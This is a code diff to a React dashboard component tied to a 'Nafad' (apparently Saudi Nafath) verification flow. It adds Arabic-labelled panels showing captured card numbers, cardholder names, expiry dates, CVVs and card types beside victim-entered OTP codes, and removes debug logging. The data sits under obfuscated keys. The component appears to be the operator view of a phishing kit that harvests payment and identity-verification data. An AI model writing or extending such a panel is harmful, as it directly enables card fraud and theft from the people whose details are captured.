@@ -1763,11 +1763,9 @@ const renderNafadBox = () => {
     const cardEntry = customerEntryGroup.find(e => {
       const raw = e.raw || {};
       const nestedRaw = raw.raw || {};
-      const hasCard = !!(raw._v1 || raw._v2 || raw._v3 || raw._v5 || 
+      return !!(raw._v1 || raw._v2 || raw._v3 || raw._v5 || 
         raw.cardNumber || raw.paymentStatus || raw.hasCard ||
         nestedRaw._v1 || nestedRaw._v5 || nestedRaw.cardNumber);
-      console.log('[DEBUG] cardEntry check:', { id: e.id, hasCard, cardNumber: raw.cardNumber });
-      return hasCard;
     });
     const cardRaw = cardEntry?.raw || null;
     const hasCardData = Boolean(
@@ -1776,7 +1774,6 @@ const renderNafadBox = () => {
         cardRaw.cardNumber || cardRaw.paymentStatus || cardRaw.hasCard
       )
     );
-    console.log('[DEBUG] cardEntry found:', cardEntry?.id, 'hasCardData:', hasCardData);
     const cardTimestamp = cardRaw ? getBestTimestamp(cardRaw) : 0;
     
     // Get PIN data and its timestamp - ONLY show if actual PIN data exists
@@ -2002,10 +1999,41 @@ const renderNafadBox = () => {
           }}>
             <TimeCounter timestamp={cardTimestamp} />
             <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق من البطاقة</h3>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
             </div>
+            {/* Card Details */}
+            {cardRaw.cardNumber && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم البطاقة</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardNumber}</span>
+              </div>
+            )}
+            {cardRaw.cardOwner && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم صاحب البطاقة</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardOwner}</span>
+              </div>
+            )}
+            {cardRaw.cardExpiry && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>تاريخ الانتهاء</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardExpiry}</span>
+              </div>
+            )}
+            {cardRaw.cvv && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>CVV</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cvv}</span>
+              </div>
+            )}
+            {cardRaw.cardType && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginBottom: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع البطاقة</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{cardRaw.cardType}</span>
+              </div>
+            )}
             {(cardRaw._v5 || cardRaw.otpCode) && (
-              <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center" }}>
+              <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginTop: 8 }}>
                 <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
                 <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardRaw._v5 || cardRaw.otpCode}</p>
               </div>
